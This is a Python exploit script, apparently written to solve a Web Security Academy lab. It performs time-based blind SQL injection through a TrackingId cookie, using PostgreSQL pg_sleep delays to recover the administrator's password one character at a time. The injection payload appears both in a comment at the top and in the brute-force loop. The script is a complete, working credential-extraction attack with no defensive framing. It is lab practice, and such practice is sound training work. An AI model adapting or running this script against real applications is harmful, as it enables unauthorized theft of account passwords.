#'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

import requests
import string
import sys

url = "https://ac2b1f0a1e765365c00c619200d70066.web-security-academy.net"

#For debugging
proxy = dict(https='http://127.0.0.1:8080',http='http://127.0.0.1:8080')

password = ""
index = 1

brute_words = string.ascii_letters + string.digits

while True:
    for i in brute_words:
        sys.stdout.write(f"\r[+] Password: {password}{i}")
        payload = f"'%3Bselect+case+when+(username='administrator'+and+substring(password,{index},1)='{i}')+then+pg_sleep(10)+else+null+end+from+users--"
        post_cookies = dict(TrackingId=f'F9f3Jpw1GBRXY1IM{payload}',session='ExVmbcGcDzKMBQkVHHpo26c4HSYbo0Za')
        r = requests.get(url , cookies= post_cookies)
        #r = requests.get(url , cookies= post_cookies,proxies = proxy,verify=False)

        if r.elapsed.seconds > 5:
            password += i
            index += 1

        #if index == 22:
        #    break
            
    #break

print("\n[+]Cracked:")
print(f"[+]Password is: {password}") 
